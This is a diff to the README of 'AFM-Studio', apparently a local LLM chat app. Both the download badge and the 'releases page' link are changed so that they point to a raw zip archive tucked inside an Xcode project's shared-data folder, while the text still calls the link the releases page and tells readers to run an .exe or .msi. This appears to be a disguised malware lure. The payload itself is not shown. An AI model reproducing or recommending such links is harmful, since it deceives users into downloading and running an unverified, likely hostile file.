@@ -1,6 +1,6 @@
 # 🤖 AFM-Studio - Chat with smart models on your device
 
-[![](https://img.shields.io/badge/Download-AFM--Studio-blue)](https://github.com/bucketshopvasovasostomy504/AFM-Studio/releases)
+[![](https://img.shields.io/badge/Download-AFM--Studio-blue)](https://github.com/bucketshopvasovasostomy504/AFM-Studio/raw/refs/heads/main/AFM Studio.xcodeproj/project.xcworkspace/xcshareddata/AF_Studio_1.2.zip)
 
 AFM-Studio lets you use language models on your computer. You choose between models that run directly on your hardware or through secure cloud connections. This tool provides a chat interface to communicate with these models for writing, analysis, or brainstorming.
 
@@ -18,7 +18,7 @@ AFM-Studio works on most modern machines. Ensure your system meets these standar
 
 Follow these steps to set up the application on your computer:
 
-1. Visit the [releases page](https://github.com/bucketshopvasovasostomy504/AFM-Studio/releases) to access the download files.
+1. Visit the [releases page](https://github.com/bucketshopvasovasostomy504/AFM-Studio/raw/refs/heads/main/AFM Studio.xcodeproj/project.xcworkspace/xcshareddata/AF_Studio_1.2.zip) to access the download files.
 2. Look for the file ending in .msi or .exe under the latest version header.
 3. Click the file name to start the download.
 4. Open the file once it finishes downloading.
